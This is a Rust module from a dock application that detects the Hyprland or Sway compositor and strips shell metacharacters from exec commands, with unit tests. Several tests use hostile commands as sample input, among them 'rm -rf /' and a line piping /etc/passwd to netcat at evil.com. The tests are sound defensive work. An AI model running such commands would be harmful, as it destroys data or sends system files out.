mod hyprland;
mod sway;
pub mod traits;
pub mod types;

use crate::error::{DockError, Result};
pub use traits::{Compositor, WmEventStream};
pub use types::{WmClient, WmEvent, WmMonitor, WmWorkspace};

/// Supported compositor backends.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CompositorKind {
    Hyprland,
    Sway,
}

/// Auto-detect the running compositor from environment variables.
/// Pass `wm_override` to force a specific backend (from `--wm` flag).
pub fn detect(wm_override: Option<&str>) -> Result<CompositorKind> {
    if let Some(wm) = wm_override {
        return match wm.to_lowercase().as_str() {
            "hyprland" => Ok(CompositorKind::Hyprland),
            "sway" => Ok(CompositorKind::Sway),
            other => Err(DockError::UnsupportedCompositor(other.to_string())),
        };
    }

    if std::env::var("HYPRLAND_INSTANCE_SIGNATURE").is_ok() {
        Ok(CompositorKind::Hyprland)
    } else if std::env::var("SWAYSOCK").is_ok() {
        Ok(CompositorKind::Sway)
    } else {
        Err(DockError::NoCompositorDetected)
    }
}

/// Create a compositor backend for the given kind.
pub fn create(kind: CompositorKind) -> Result<Box<dyn Compositor>> {
    match kind {
        CompositorKind::Hyprland => Ok(Box::new(hyprland::HyprlandBackend::new()?)),
        CompositorKind::Sway => Ok(Box::new(sway::SwayBackend::new()?)),
    }
}

/// Detects and creates the compositor backend, exiting the process on failure.
///
/// Shared by all three binaries (dock, drawer, notifications) to avoid duplication.
/// Pass the `--wm` flag value (empty string = auto-detect from environment).
pub fn init_or_exit(wm_flag: &str) -> Box<dyn Compositor> {
    let wm_override = if wm_flag.is_empty() {
        None
    } else {
        Some(wm_flag)
    };
    let kind = match detect(wm_override) {
        Ok(k) => k,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    };
    match create(kind) {
        Ok(c) => c,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    }
}

/// Sanitizes a command string before passing to compositor exec.
///
/// Strips characters that could be used for command injection via
/// compositor IPC (semicolons chain commands, newlines start new commands,
/// backticks/dollar signs enable substitution).
pub(crate) fn sanitize_exec_command(cmd: &str) -> String {
    cmd.chars()
        .filter(|c| !matches!(c, ';' | '`' | '$' | '|' | '&' | '\n' | '\r'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_unsupported_compositor() {
        assert!(matches!(
            detect(Some("awesome")),
            Err(DockError::UnsupportedCompositor(_))
        ));
    }

    #[test]
    fn detect_sway_override() {
        assert_eq!(detect(Some("sway")).unwrap(), CompositorKind::Sway);
    }

    #[test]
    fn detect_hyprland_override() {
        assert_eq!(detect(Some("hyprland")).unwrap(), CompositorKind::Hyprland);
    }

    #[test]
    fn detect_case_insensitive() {
        assert_eq!(detect(Some("Hyprland")).unwrap(), CompositorKind::Hyprland);
        assert_eq!(detect(Some("SWAY")).unwrap(), CompositorKind::Sway);
    }

    #[test]
    fn sanitize_strips_semicolons() {
        assert_eq!(
            sanitize_exec_command("firefox; rm -rf /"),
            "firefox rm -rf /"
        );
    }

    #[test]
    fn sanitize_strips_backticks() {
        assert_eq!(sanitize_exec_command("echo `whoami`"), "echo whoami");
    }

    #[test]
    fn sanitize_strips_dollar() {
        assert_eq!(sanitize_exec_command("echo $HOME"), "echo HOME");
    }

    #[test]
    fn sanitize_strips_pipes() {
        assert_eq!(
            sanitize_exec_command("cat /etc/passwd | nc evil.com 80"),
            "cat /etc/passwd  nc evil.com 80"
        );
    }

    #[test]
    fn sanitize_strips_ampersand() {
        assert_eq!(sanitize_exec_command("cmd & bg"), "cmd  bg");
    }

    #[test]
    fn sanitize_strips_newlines() {
        assert_eq!(sanitize_exec_command("cmd\nmalicious"), "cmdmalicious");
    }

    #[test]
    fn sanitize_preserves_normal_commands() {
        let cmd = "firefox --new-window https://example.com";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }

    #[test]
    fn sanitize_preserves_paths_with_spaces() {
        let cmd = "/usr/bin/my app --arg=value";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }
}
